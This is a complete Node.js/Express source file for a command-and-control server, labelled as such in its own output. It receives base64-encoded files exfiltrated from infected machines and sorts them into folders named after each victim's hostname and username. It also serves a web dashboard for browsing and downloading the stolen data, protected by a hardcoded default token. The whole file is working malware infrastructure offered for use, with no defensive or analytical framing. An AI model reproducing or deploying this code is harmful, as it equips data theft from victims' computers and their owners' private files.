const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json({ limit: '100mb' }));

const VICTIMS_DIR = path.join(__dirname, 'victims');
const SECRET_TOKEN = process.env.SECRET_TOKEN || 'qutmess';

if (!fsSync.existsSync(VICTIMS_DIR)) {
    fsSync.mkdirSync(VICTIMS_DIR, { recursive: true });
}
console.log('Victims folder:', VICTIMS_DIR);

app.get('/', async (req, res) => {
    try {
        const items = await fs.readdir(VICTIMS_DIR);
        const victims = [];
        for (const item of items) {
            const stat = await fs.stat(path.join(VICTIMS_DIR, item));
            if (stat.isDirectory()) victims.push(item);
        }
        res.send('<h2>C2 Dashboard — ' + victims.length + ' victims</h2><ul>' + 
            victims.map(v => '<li><a href="/victim/' + v + '">' + v + '</a></li>').join('') + 
            '</ul>');
    } catch (err) {
        console.error(err);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/send', async (req, res) => {
    try {
        const { hostname, username, token, filename, content } = req.body;
        if (token !== SECRET_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
        if (!hostname || !username) return res.status(400).json({ error: 'Missing hostname or username' });
        if (!content) return res.status(400).json({ error: 'No content provided' });

        const safeName = (hostname + '_' + username).replace(/[^a-zA-Z0-9_-]/g, '_');
        const victimDir = path.join(VICTIMS_DIR, safeName);
        const safeFilename = (filename || 'data.txt').replace(/[^a-zA-Z0-9._-]/g, '_');
        const filePath = path.join(victimDir, safeFilename);

        await fs.mkdir(victimDir, { recursive: true });
        await fs.writeFile(filePath, content, 'base64');
        console.log('[+]', safeName, '— saved', safeFilename);
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Server error' });
    }
});

app.get('/victim/:id', async (req, res) => {
    try {
        const victimId = req.params.id.replace(/[^a-zA-Z0-9_-]/g, '_');
        const victimDir = path.join(VICTIMS_DIR, victimId);
        if (!fsSync.existsSync(victimDir)) return res.status(404).send('Not found');
        const files = await fs.readdir(victimDir, { withFileTypes: true });
        let html = '<h2>Victim: ' + victimId + '</h2><a href="/">⬅ Back</a><ul>';
        files.forEach(f => {
            if (f.isDirectory()) html += '<li><a href="/victim/' + victimId + '/' + f.name + '/">' + f.name + '/</a></li>';
            else html += '<li><a href="/download/' + victimId + '/' + f.name + '">' + f.name + '</a></li>';
        });
        res.send(html + '</ul>');
    } catch (err) {
        console.error(err);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/victim/:id/*subpath', async (req, res) => {
    try {
        const victimId = req.params.id.replace(/[^a-zA-Z0-9_-]/g, '_');
        const subRaw = req.params.subpath;
        const subPath = (Array.isArray(subRaw) ? subRaw.join('/') : String(subRaw || '')).replace(/[^a-zA-Z0-9_/-]/g, '');
        const fullPath = path.join(VICTIMS_DIR, victimId, subPath);
        if (!fsSync.existsSync(fullPath)) return res.status(404).send('Not found');
        const stats = await fs.stat(fullPath);
        if (stats.isDirectory()) {
            const files = await fs.readdir(fullPath, { withFileTypes: true });
            const parentPath = path.dirname(subPath).replace(/\\/g, '/');
            const backLink = parentPath === '.' ? '/victim/' + victimId : '/victim/' + victimId + '/' + parentPath + '/';
            let html = '<h2>Folder: ' + subPath + '</h2><a href="' + backLink + '">⬅ Back</a><ul>';
            files.forEach(f => {
                if (f.isDirectory()) html += '<li><a href="/victim/' + victimId + '/' + subPath + '/' + f.name + '/">' + f.name + '/</a></li>';
                else html += '<li><a href="/download/' + victimId + '/' + subPath + '/' + f.name + '">' + f.name + '</a></li>';
            });
            res.send(html + '</ul>');
        } else {
            res.sendFile(fullPath);
        }
    } catch (err) {
        console.error(err);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/download/:id/*filename', async (req, res) => {
    try {
        const victimId = req.params.id.replace(/[^a-zA-Z0-9_-]/g, '_');
        const fileRaw = req.params.filename;
        const filename = (Array.isArray(fileRaw) ? fileRaw : [fileRaw || ''])
            .map((p) => String(p).replace(/[^a-zA-Z0-9._-]/g, '_'))
            .filter(Boolean)
            .join('/');
        const filePath = path.join(VICTIMS_DIR, victimId, filename);
        if (!fsSync.existsSync(filePath)) return res.status(404).send('Not found');
        res.download(filePath);
    } catch (err) {
        console.error(err);
        res.status(500).send('Internal Server Error');
    }
});

const PORT = Number(process.env.PORT) || 3000; // Railway sets PORT
const HOST = process.env.HOST || '0.0.0.0'; // 0.0.0.0 = listen on all interfaces

app.listen(PORT, HOST, () => {
    const displayHost = HOST === '0.0.0.0' ? 'all interfaces' : HOST;
    console.log('C2 listening on ' + displayHost + ':' + PORT + ' (POST /send); clients: C2_SEND_URL + /send, C2_SECRET_TOKEN');
});
